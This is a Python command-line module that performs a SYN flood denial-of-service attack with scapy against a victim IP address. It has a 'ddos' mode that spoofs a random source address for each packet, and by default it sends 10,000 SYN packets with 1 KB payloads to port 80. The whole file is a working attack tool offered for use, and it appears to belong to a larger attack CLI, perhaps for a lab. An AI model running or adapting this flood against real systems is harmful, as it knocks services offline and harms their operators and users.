import click
from scapy.all import IP, TCP, Raw, send

from cli.utils.common import get_victim_ip, rand_int, random_ip


@click.command()
@click.option("-i", "--ip", help="IP address of the victim", type=str)
@click.option(
    "-n", "--num-pkg", help="Number of packages to send", type=int, default=10000
)
@click.option(
    "-m",
    "--mode",
    help="Attack mode",
    type=click.Choice(["dos", "ddos"]),
    default="dos",
)
@click.pass_context
def syn_flood(ctx, ip, num_pkg, mode):
    """SYN flood attack"""
    click.echo("\n\n-------------------- SYN flood attack ---------------------\n")
    if not ip:
        ip = get_victim_ip()

    click.echo(f"{mode} SYN flood attack on {ip} started!")
    click.echo(f"Click to open legitimate website: http://{ip}")
    src_ip = random_ip()

    for _ in range(num_pkg):
        if mode == "ddos":
            src_ip = random_ip()
        IP_packet = IP(src=src_ip, dst=ip)
        TCP_package = TCP(
            sport=80, dport=80, flags="S", seq=rand_int(), window=rand_int()
        )

        raw = Raw(b"X" * 1024)
        send(IP_packet / TCP_package / raw, verbose=0)

    click.echo(
        f"{mode}SYN flood attack on {ip} finished! Total {num_pkg} packages sent\n"
    )
